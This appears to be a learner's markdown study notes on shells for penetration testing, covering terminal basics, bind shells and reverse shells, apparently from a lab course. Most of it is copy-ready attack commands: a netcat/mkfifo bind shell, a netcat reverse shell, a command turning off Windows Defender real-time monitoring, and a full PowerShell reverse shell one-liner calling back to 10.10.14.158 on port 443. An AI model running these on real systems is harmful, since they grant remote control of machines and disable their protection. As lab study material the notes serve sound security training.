- [ ] Anatomy Of a Shell
```
Every operating system has a shell, and to interact with it, we must use an application known as a terminal emulator.
```
Command Language Interpreters!!!
```
Many different command language interpreters can be used, some of which are also called shell scripting languages or Command and Scripting interpreters as defined in the Execution techniques of the MITRE ATT&CK Matrix.

CLI= OS+Terminal Emulator App+ Command language interpreter
$PSversiontable
```
- [ ] Blind Shell
![[Pasted image 20250609120418.png]]
```
With a bind shell, the target system has a listener started and awaits a connection from a pentester's system...
```
Pratical!!!
```sh
# target
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lp 7777 > /tmp/f

# attacker
nc 10.129.41.200 7777
```
- [ ] Reverse Shell
![[Pasted image 20250609120447.png]]
```
With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc IP 443 > /tmp/f
```
Pratical!!!
```sh
# attack box
nc -lvnp 443
# target box
Set-MpPreference -DisableRealtimeMonitoring $true
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
